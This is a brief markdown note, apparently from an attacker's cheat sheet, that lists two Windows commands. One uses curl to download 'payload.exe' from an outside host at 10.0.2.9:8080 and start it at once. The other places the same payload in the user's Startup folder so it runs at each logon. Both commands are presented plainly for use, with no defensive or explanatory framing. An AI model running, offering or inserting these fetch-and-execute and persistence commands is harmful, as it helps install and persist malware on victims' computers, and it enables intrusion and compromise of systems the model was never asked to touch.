## Shell command line for install payload and run immediately

```
curl -o background.exe http://10.0.2.9:8080/payload.exe & start background.exe
```
## Startup version

```
curl -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background.exe" http://10.0.2.9:8080/payload.exe
```
